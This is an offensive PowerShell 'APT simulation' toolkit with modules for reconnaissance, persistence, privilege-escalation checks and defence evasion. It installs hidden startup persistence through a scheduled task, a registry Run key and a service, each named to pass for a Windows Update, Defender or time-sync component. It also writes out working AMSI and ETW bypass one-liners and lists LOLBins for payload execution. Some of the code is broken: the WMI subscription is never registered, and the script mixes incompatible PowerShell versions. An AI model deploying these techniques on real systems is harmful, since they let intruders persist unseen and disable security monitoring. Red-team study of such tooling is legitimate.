# APT PowerShell Toolkit
# Advanced PowerShell-based APT simulation tools
# For educational and authorized penetration testing only

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Target,
    [Parameter(Mandatory=$false)]
    [string]$OutputDir = "APT_Output_$(Get-Date -Format 'yyyyMMdd_HHmmss')",
    [Parameter(Mandatory=$false)]
    [switch]$Recon,
    [Parameter(Mandatory=$false)]
    [switch]$Persistence,
    [Parameter(Mandatory=$false)]
    [switch]$PrivEsc,
    [Parameter(Mandatory=$false)]
    [switch]$DefenseEvasion,
    [Parameter(Mandatory=$false)]
    [switch]$All
)

# Banner
Write-Host ""
Write-Host "    ___  _____ _____   _____                      _           " -ForegroundColor Blue
Write-Host "   / _ \|  _  |  __ \ /  __ \                    (_)          " -ForegroundColor Blue
Write-Host "  / /_\ \ | | | |  \/ | /  \/ ___  _ __  ___  ___ _  ___  _ __ " -ForegroundColor Blue
Write-Host "  |  _  | | | | | __  | |    / _ \| '_ \/ __|/ __| |/ _ \| '_ \" -ForegroundColor Blue
Write-Host "  | | | \ \_/ / |_\ \ | \__/\ (_) | | | \__ \ (__| | (_) | | | |" -ForegroundColor Blue
Write-Host "  \_| |_/\___/ \____/  \____/\___/|_| |_|___/\___|_|\___/|_| |_|" -ForegroundColor Blue
Write-Host ""
Write-Host "  Advanced Persistent Threat PowerShell Toolkit" -ForegroundColor Yellow
Write-Host "  For Educational and Authorized Testing Only" -ForegroundColor Red
Write-Host ""

# Check for Administrator privileges
function Test-AdminPrivileges {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Create output directory
if (!(Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir | Out-Null
    Write-Host "[+] Output directory created: $OutputDir" -ForegroundColor Green
}

# Module 1: Reconnaissance
function Invoke-APTRecon {
    Write-Host "[*] Starting APT Reconnaissance Module..." -ForegroundColor Blue
    
    $reconOutput = Join-Path $OutputDir "Reconnaissance"
    New-Item -ItemType Directory -Path $reconOutput | Out-Null
    
    # System Information
    Write-Host "  [+] Gathering system information..." -ForegroundColor Yellow
    $systemInfo = @{
        ComputerName = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        UserName = $env:USERNAME
        OSVersion = [System.Environment]::OSVersion.VersionString
        Architecture = [System.Environment]::Is64BitOperatingSystem ? "64-bit" : "32-bit"
        Processors = (Get-WmiObject -Class Win32_Processor).Name
        TotalMemory = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    }
    $systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $reconOutput "System_Info.json")
    
    # Network Information
    Write-Host "  [+] Gathering network information..." -ForegroundColor Yellow
    $networkInfo = Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address, DNSServer
    $networkInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $reconOutput "Network_Info.json")
    
    # User Information
    Write-Host "  [+] Gathering user information..." -ForegroundColor Yellow
    $users = Get-WmiObject -Class Win32_UserAccount | Select-Object Name, Domain, SID, Disabled, Lockout, PasswordRequired
    $users | ConvertTo-Json | Out-File -FilePath (Join-Path $reconOutput "User_Accounts.json")
    
    # Process Information
    Write-Host "  [+] Gathering process information..." -ForegroundColor Yellow
    $processes = Get-Process | Select-Object ProcessName, Id, CPU, WorkingSet, Path
    $processes | ConvertTo-Json | Out-File -FilePath (Join-Path $reconOutput "Processes.json")
    
    # Service Information
    Write-Host "  [+] Gathering service information..." -ForegroundColor Yellow
    $services = Get-Service | Select-Object Name, DisplayName, Status, StartType
    $services | ConvertTo-Json | Out-File -FilePath (Join-Path $reconOutput "Services.json")
    
    # Installed Software
    Write-Host "  [+] Gathering installed software information..." -ForegroundColor Yellow
    $software = Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor, InstallDate
    $software | ConvertTo-Json | Out-File -FilePath (Join-Path $reconOutput "Installed_Software.json")
    
    Write-Host "[+] Reconnaissance completed" -ForegroundColor Green
}

# Module 2: Persistence
function Invoke-APTPersistence {
    Write-Host "[*] Starting APT Persistence Module..." -ForegroundColor Blue
    
    if (!(Test-AdminPrivileges)) {
        Write-Host "[-] Administrator privileges required for persistence techniques" -ForegroundColor Red
        return
    }
    
    $persistenceOutput = Join-Path $OutputDir "Persistence"
    New-Item -ItemType Directory -Path $persistenceOutput | Out-Null
    
    # Scheduled Task Persistence
    Write-Host "  [+] Creating scheduled task persistence..." -ForegroundColor Yellow
    $taskName = "WindowsUpdateService_$(Get-Random)"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Start-Sleep 60'"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -Hidden
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "Windows Update Service" | Out-Null
    
    # Registry Run Key Persistence
    Write-Host "  [+] Creating registry run key persistence..." -ForegroundColor Yellow
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsDefenderUpdate_$(Get-Random)"
    $regValue = "powershell.exe -WindowStyle Hidden -Command 'Start-Sleep 120'"
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
    
    # WMI Event Subscription Persistence
    Write-Host "  [+] Creating WMI event subscription persistence..." -ForegroundColor Yellow
    $filterQuery = @"
SELECT * FROM __InstanceCreationEvent 
WITHIN 10 
WHERE TargetInstance ISA 'Win32_Process' 
AND TargetInstance.Name = 'explorer.exe'
"@
    
    $consumerCommand = @"
\$Command = \"powershell.exe -WindowStyle Hidden -Command 'Start-Sleep 30'\"
Start-Process powershell.exe -ArgumentList \"-WindowStyle Hidden -Command \\`\$Command\"
"@
    
    # Service Persistence
    Write-Host "  [+] Creating service persistence..." -ForegroundColor Yellow
    $serviceName = "WindowsTimeSync_$(Get-Random)"
    New-Service -Name $serviceName -BinaryPathName "C:\Windows\System32\svchost.exe -k netsvcs" -Description "Windows Time Synchronization Service" -StartupType "Automatic" | Out-Null
    
    # Persistence Report
    $persistenceInfo = @{
        ScheduledTask = $taskName
        RegistryKey = $regName
        Service = $serviceName
        WMIEvent = "Explorer Process Creation"
    }
    $persistenceInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $persistenceOutput "Persistence_Mechanisms.json")
    
    Write-Host "[+] Persistence mechanisms installed" -ForegroundColor Green
}

# Module 3: Privilege Escalation
function Invoke-APTPrivEsc {
    Write-Host "[*] Starting APT Privilege Escalation Module..." -ForegroundColor Blue
    
    $privEscOutput = Join-Path $OutputDir "PrivilegeEscalation"
    New-Item -ItemType Directory -Path $privEscOutput | Out-Null
    
    # Check for common privilege escalation vectors
    Write-Host "  [+] Checking for privilege escalation vectors..." -ForegroundColor Yellow
    
    # Unquoted Service Paths
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '\"*\"' -and $_.PathName -like "* *" }
    $services | Select-Object Name, PathName | ConvertTo-Json | Out-File -FilePath (Join-Path $privEscOutput "Unquoted_Service_Paths.json")
    
    # Weak Service Permissions
    $weakServices = Get-WmiObject -Class Win32_Service | Where-Object { 
        $_.StartName -eq "LocalSystem" -or $_.StartName -like "*LocalService*" -or $_.StartName -like "*NetworkService*"
    }
    $weakServices | Select-Object Name, StartName, State | ConvertTo-Json | Out-File -FilePath (Join-Path $privEscOutput "Weak_Service_Permissions.json")
    
    # AlwaysInstallElevated
    $alwaysInstallElevated = @{
        HKLM = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
        HKCU = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
    }
    $alwaysInstallElevated | ConvertTo-Json | Out-File -FilePath (Join-Path $privEscOutput "AlwaysInstallElevated.json")
    
    # Token Privileges
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $privileges = $currentUser.Claims | Where-Object { $_.Value -like "Se*Privilege" }
    $privileges | Select-Object Value | ConvertTo-Json | Out-File -FilePath (Join-Path $privEscOutput "Token_Privileges.json")
    
    Write-Host "[+] Privilege escalation analysis completed" -ForegroundColor Green
}

# Module 4: Defense Evasion
function Invoke-APTDefenseEvasion {
    Write-Host "[*] Starting APT Defense Evasion Module..." -ForegroundColor Blue
    
    $defenseEvasionOutput = Join-Path $OutputDir "DefenseEvasion"
    New-Item -ItemType Directory -Path $defenseEvasionOutput | Out-Null
    
    # AMSI Bypass
    Write-Host "  [+] Implementing AMSI bypass..." -ForegroundColor Yellow
    $amsiBypass = @'
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
'@
    $amsiBypass | Out-File -FilePath (Join-Path $defenseEvasionOutput "AMSI_Bypass.ps1")
    
    # ETW Bypass
    Write-Host "  [+] Implementing ETW bypass..." -ForegroundColor Yellow
    $etwBypass = @'
[System.Diagnostics.Eventing.EventProvider].GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0)
'@
    $etwBypass | Out-File -FilePath (Join-Path $defenseEvasionOutput "ETW_Bypass.ps1")
    
    # Process Injection Techniques
    Write-Host "  [+] Documenting process injection techniques..." -ForegroundColor Yellow
    $injectionTechniques = @(
        @{ Name = "Process Hollowing"; Description = "Replace legitimate process memory with malicious code" },
        @{ Name = "DLL Injection"; Description = "Inject DLL into remote process" },
        @{ Name = "APC Injection"; Description = "Use Asynchronous Procedure Calls for code execution" },
        @{ Name = "Thread Hijacking"; Description = "Hijack existing thread for code execution" }
    )
    $injectionTechniques | ConvertTo-Json | Out-File -FilePath (Join-Path $defenseEvasionOutput "Process_Injection_Techniques.json")
    
    # Living Off The Land Binaries
    Write-Host "  [+] Documenting Living Off The Land binaries..." -ForegroundColor Yellow
    $lolbins = @(
        @{ Name = "msbuild.exe"; Path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"; Usage = "Execute XML-based payloads" },
        @{ Name = "installutil.exe"; Path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"; Usage = "Execute .NET assemblies" },
        @{ Name = "regsvcs.exe"; Path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe"; Usage = "Execute .NET assemblies" },
        @{ Name = "regasm.exe"; Path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe"; Usage = "Execute .NET assemblies" },
        @{ Name = "mshta.exe"; Path = "C:\Windows\System32\mshta.exe"; Usage = "Execute HTA files" }
    )
    $lolbins | ConvertTo-Json | Out-File -FilePath (Join-Path $defenseEvasionOutput "LOLBins.json")
    
    Write-Host "[+] Defense evasion techniques documented" -ForegroundColor Green
}

# Main execution logic
if ($All -or $Recon) {
    Invoke-APTRecon
}

if ($All -or $Persistence) {
    Invoke-APTPersistence
}

if ($All -or $PrivEsc) {
    Invoke-APTPrivEsc
}

if ($All -or $DefenseEvasion) {
    Invoke-APTDefenseEvasion
}

# Generate summary report
Write-Host ""
Write-Host "[+] APT PowerShell Toolkit Execution Summary" -ForegroundColor Green
Write-Host "    Output Directory: $OutputDir" -ForegroundColor Yellow
Write-Host "    Modules Executed:" -ForegroundColor Yellow
if ($All -or $Recon) { Write-Host "      - Reconnaissance" -ForegroundColor White }
if ($All -or $Persistence) { Write-Host "      - Persistence" -ForegroundColor White }
if ($All -or $PrivEsc) { Write-Host "      - Privilege Escalation" -ForegroundColor White }
if ($All -or $DefenseEvasion) { Write-Host "      - Defense Evasion" -ForegroundColor White }
Write-Host ""
Write-Host "[+] Analysis complete. Review generated files in: $OutputDir" -ForegroundColor Green

# Display generated files
Write-Host ""
Write-Host "Generated Files:" -ForegroundColor Blue
Get-ChildItem -Path $OutputDir -Recurse -File | ForEach-Object {
    Write-Host "  - $($_.FullName)" -ForegroundColor White
}